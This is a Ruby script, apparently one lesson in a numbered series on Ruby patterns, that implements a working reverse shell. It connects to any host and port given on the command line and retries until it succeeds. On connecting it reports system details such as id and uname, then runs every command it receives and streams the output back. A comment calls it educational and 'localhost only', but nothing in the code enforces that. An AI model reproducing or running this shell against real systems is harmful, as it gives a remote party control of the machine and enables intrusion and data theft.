#!/usr/bin/env ruby
# frozen_string_literal: true

# 08_reverse_shell.rb — reverse shell via TCPSocket + Open3
require "socket"
require "open3"

# EDUCATIONAL SCRIPT — localhost only, for learning Ruby patterns.
# Demonstrates TCPSocket, Open3.popen2e for process I/O,
# trap(SIGINT) for clean shutdown, and Dir.chdir.

if ARGV.length < 2
  puts "Usage: ruby 08_reverse_shell.rb <host> <port>"
  exit 1
end

host = ARGV[0]
port = ARGV[1]

trap("SIGINT") do
  puts "\nShutting down..."
  exit 0
end

puts "Connecting to #{host}:#{port}..."

begin
  socket = TCPSocket.new(host, port)
rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
  puts "Connection failed. Retrying in 5s..."
  sleep 5
  retry
end

puts "Connected! Type 'exit' or 'quit' to disconnect."

# Show system info on connect
socket.puts "Ruby Reverse Shell connected."
socket.puts "ID: #{`id`.chomp}"
socket.puts "PWD: #{Dir.pwd}"
socket.puts "UNAME: #{`uname -a`.chomp}"
socket.puts "---"

work_dir = Dir.pwd

loop do
  socket.print "#{work_dir}> "
  cmd = socket.gets&.chomp
  break if cmd.nil? || %w[exit quit].include?(cmd.downcase)

  if cmd.match?(/cd (.+)/i)
    work_dir = File.expand_path(::Regexp.last_match(1), work_dir)
    Dir.chdir(work_dir)
    next
  end

  Open3.popen2e("cd #{work_dir} && #{cmd}") do |_stdin, stdothers|
    IO.copy_stream(stdothers, socket)
  end
rescue StandardError => e
  socket.puts "Error: #{e.message}"
end

socket.close
puts "Disconnected."

# Thinking in Ruby
#
# TCPSocket + Open3.popen2e builds a reverse shell that executes
# commands remotely and streams output back. Ruby's retry mechanism
# handles connection failures gracefully (retry on ECONNREFUSED),
# and the trap block ensures clean shutdown. The pattern shows how
# Ruby's networking and process tools combine into one fluid loop.
